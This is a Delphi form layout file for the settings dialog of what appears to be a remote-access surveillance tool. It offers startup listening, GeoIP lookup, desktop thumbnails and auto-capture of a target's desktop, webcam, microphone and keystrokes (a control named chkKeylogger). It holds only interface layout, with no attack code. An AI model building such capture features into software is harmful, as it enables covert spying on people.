object FormSettings: TFormSettings
  Left = 388
  Top = 89
  BorderStyle = bsDialog
  Caption = 'Settings'
  ClientHeight = 424
  ClientWidth = 273
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  OnShow = FormShow
  PixelsPerInch = 96
  TextHeight = 13
  object chkStartup: TCheckBox
    Left = 8
    Top = 8
    Width = 97
    Height = 17
    Caption = 'Startup listening'
    TabOrder = 0
  end
  object chkGeoip: TCheckBox
    Left = 8
    Top = 32
    Width = 105
    Height = 17
    Caption = 'GeoIp localisation'
    TabOrder = 1
  end
  object chkMinnimizeToTray: TCheckBox
    Left = 136
    Top = 8
    Width = 129
    Height = 17
    Caption = 'Minimize to system tray'
    TabOrder = 2
  end
  object chkCloseToTray: TCheckBox
    Left = 136
    Top = 32
    Width = 121
    Height = 17
    Caption = 'Close to system tray'
    TabOrder = 3
  end
  object chkSound: TCheckBox
    Left = 8
    Top = 56
    Width = 105
    Height = 17
    Caption = 'Sound notification'
    TabOrder = 4
  end
  object grp2: TGroupBox
    Left = 8
    Top = 88
    Width = 257
    Height = 89
    Caption = 'Desktop preview'
    TabOrder = 5
    object lbl1: TLabel
      Left = 16
      Top = 56
      Width = 69
      Height = 13
      Caption = 'Thumbnail size'
    end
    object lbl2: TLabel
      Left = 144
      Top = 56
      Width = 6
      Height = 13
      Caption = 'X'
    end
    object seWidth: TSpinEdit
      Left = 96
      Top = 52
      Width = 41
      Height = 22
      MaxLength = 3
      MaxValue = 200
      MinValue = 32
      TabOrder = 0
      Value = 100
    end
    object seHeight: TSpinEdit
      Left = 160
      Top = 52
      Width = 41
      Height = 22
      MaxLength = 3
      MaxValue = 200
      MinValue = 32
      TabOrder = 1
      Value = 64
    end
    object chkThumbs: TCheckBox
      Left = 16
      Top = 24
      Width = 137
      Height = 17
      Caption = 'Enable desktop preview'
      TabOrder = 2
      OnClick = chkThumbsClick
    end
  end
  object chkVisual: TCheckBox
    Left = 136
    Top = 56
    Width = 105
    Height = 17
    Caption = 'Visual notification'
    TabOrder = 6
  end
  object grp1: TGroupBox
    Left = 8
    Top = 184
    Width = 257
    Height = 81
    Caption = 'Autostart capture'
    TabOrder = 7
    object chkDesktop: TCheckBox
      Left = 16
      Top = 24
      Width = 65
      Height = 17
      Caption = 'Desktop'
      TabOrder = 0
    end
    object chkCam: TCheckBox
      Left = 16
      Top = 48
      Width = 65
      Height = 17
      Caption = 'Webcam'
      TabOrder = 1
    end
    object chkMicrophone: TCheckBox
      Left = 160
      Top = 24
      Width = 81
      Height = 17
      Caption = 'Microphone'
      TabOrder = 2
    end
    object chkKeylogger: TCheckBox
      Left = 160
      Top = 48
      Width = 73
      Height = 17
      Caption = 'Keyboard'
      TabOrder = 3
    end
  end
  object btn1: TButton
    Left = 104
    Top = 392
    Width = 75
    Height = 25
    Caption = 'OK'
    TabOrder = 8
    OnClick = btn1Click
  end
  object btn2: TButton
    Left = 190
    Top = 392
    Width = 75
    Height = 25
    Caption = 'Cancel'
    TabOrder = 9
    OnClick = btn2Click
  end
  object grp3: TGroupBox
    Left = 8
    Top = 272
    Width = 257
    Height = 113
    Caption = 'Appearance'
    TabOrder = 10
    object lblSkin: TLabel
      Left = 144
      Top = 24
      Width = 48
      Height = 13
      Cursor = crHandPoint
      Caption = 'Skin name'
      Enabled = False
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -11
      Font.Name = 'Tahoma'
      Font.Style = [fsItalic, fsUnderline]
      ParentFont = False
      OnClick = lblSkinClick
    end
    object lblHue: TLabel
      Left = 16
      Top = 56
      Width = 36
      Height = 13
      Caption = 'HUE : 0'
    end
    object lblSaturation: TLabel
      Left = 16
      Top = 80
      Width = 63
      Height = 13
      Caption = 'Saturation: 0'
    end
    object chkSkin: TCheckBox
      Left = 16
      Top = 24
      Width = 81
      Height = 17
      Caption = 'Enable skin'
      TabOrder = 0
      OnClick = chkSkinClick
    end
    object trckbrHue: TTrackBar
      Left = 96
      Top = 50
      Width = 153
      Height = 25
      Enabled = False
      Max = 360
      TabOrder = 1
      TickMarks = tmBoth
      TickStyle = tsNone
      OnChange = trckbrHueChange
    end
    object trckbrSaturation: TTrackBar
      Left = 104
      Top = 74
      Width = 145
      Height = 25
      Enabled = False
      Max = 100
      Min = -100
      TabOrder = 2
      TickMarks = tmBoth
      TickStyle = tsNone
      OnChange = trckbrSaturationChange
    end
  end
  object dlgOpen1: TOpenDialog
    DefaultExt = 'asz'
    Filter = 'Skin file (*.asz)|*.asz'
    InitialDir = 'Skins'
    Left = 16
    Top = 8
  end
end
